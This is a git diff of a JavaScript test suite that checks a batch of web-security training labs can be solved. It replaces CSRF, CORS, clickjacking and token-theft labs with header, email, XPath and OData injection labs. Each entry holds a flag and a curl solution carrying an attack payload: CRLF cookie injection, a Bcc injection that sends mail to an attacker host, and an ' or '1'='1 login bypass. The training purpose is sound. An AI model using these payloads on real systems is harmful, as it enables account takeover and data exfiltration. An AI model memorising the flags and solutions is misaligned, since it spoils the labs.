@@ -4,11 +4,10 @@ import path from 'node:path'
 import { createSession } from './session'
 
 // End-to-end solvability check for the WEB labs batch B6
-// (web-csrf, web-cors-deep, web-clickjacking, web-webstorage). Each entry loads
-// the REAL fixture bundle, mirrors the lesson `lab:` block, replays the intended
-// solution with the emulated shell/tools and asserts `check` passes.
+// (web-header-injection, web-email-injection, web-xml-injection, web-odata-injection).
 const dir = path.resolve(process.cwd(), '../content/labs')
 const WD = '/home/student/task'
+const CHECK = "grep -q 'nto{' found.txt"
 
 function load(id) {
   return JSON.parse(fs.readFileSync(path.join(dir, `${id}.json`), 'utf8'))
@@ -16,40 +15,34 @@ function load(id) {
 
 const LABS = [
   {
-    id: 'web-csrf', flag: 'nto{csrf_n0_t0k3n_3ma1l_ch4ng3}', hints: 4,
-    check: "grep -q 'nto{' found.txt",
+    id: 'web-header-injection', flag: 'nto{crlf_r3sp0ns3_sp1lt_c00k13}', hints: 4,
     solution: [
-      `curl -s https://shop.local/profile -H 'Cookie: session=alice' > profile.html`,
-      `curl -s -X POST https://shop.local/profile/email -d 'email=attacker@evil.com' -H 'Cookie: session=alice' > found.txt`,
+      `curl -sI 'https://app.target/go?next=%2Fdashboard%0d%0aSet-Cookie:%20role=admin' > found.txt`,
     ],
   },
   {
-    id: 'web-cors-deep', flag: 'nto{c0rs_r3fl3ct3d_0r1g1n_w1th_cr3ds}', hints: 4,
-    check: "grep -q 'nto{' found.txt",
+    id: 'web-email-injection', flag: 'nto{smtp_h34d3r_1nj3ct10n_bcc}', hints: 4,
     solution: [
-      `curl -s -i https://api.shop.local/me -H 'Origin: https://evil.local' -b 'session=victim' > found.txt`,
+      `curl -s -X POST 'https://app.target/contact' --data-binary 'email=me@example.com%0aBcc:exfil@attacker.test&message=hi' > found.txt`,
     ],
   },
   {
-    id: 'web-clickjacking', flag: 'nto{cl1ckj4ck3d_3ma1l_ch4ng3}', hints: 4,
-    check: "grep -q 'opacity' clickjack.html && grep -q 'nto{' found.txt",
+    id: 'web-xml-injection', flag: 'nto{xp4th_1nj3ct10n_l0g1n_byp4ss}', hints: 4,
     solution: [
-      `echo '<iframe src="https://victim.com/account/email" style="opacity:0.0001"></iframe>' > clickjack.html`,
-      `curl -s -X POST https://victim.com/account/email -d 'email=attacker@evil.com' -H 'Cookie: session=victim' > found.txt`,
+      `curl -s -X POST 'https://app.target/login' --data "<login><user>alice</user><pass>' or '1'='1</pass></login>" > found.txt`,
     ],
   },
   {
-    id: 'web-webstorage', flag: 'nto{l0c4lst0r4g3_t0k3n_th3ft}', hints: 4,
-    check: "grep -q 'nto{' found.txt",
+    id: 'web-odata-injection', flag: 'nto{0d4t4_f1lt3r_0r_byp4ss}', hints: 4,
     solution: [
-      `cut -d. -f2 access_token.jwt | base64 -d > found.txt`,
+      `curl -s 'https://app.target/odata/Users?%24filter=Dept eq 7 or 1 eq 1' > found.txt`,
     ],
   },
 ]
 
-describe.each(LABS)('web lab B6: $id', ({ id, flag, hints, check, solution }) => {
+describe.each(LABS)('web lab B6: $id', ({ id, flag, hints, solution }) => {
   const bundle = load(id)
-  const spec = { kind: 'shell', workdir: WD, check, hints: Array(hints).fill('h') }
+  const spec = { kind: 'shell', workdir: WD, check: CHECK, hints: Array(hints).fill('h') }
 
   it('bundle + seed files are consistent with the lesson lab block', () => {
     expect(bundle.id).toBe(id)
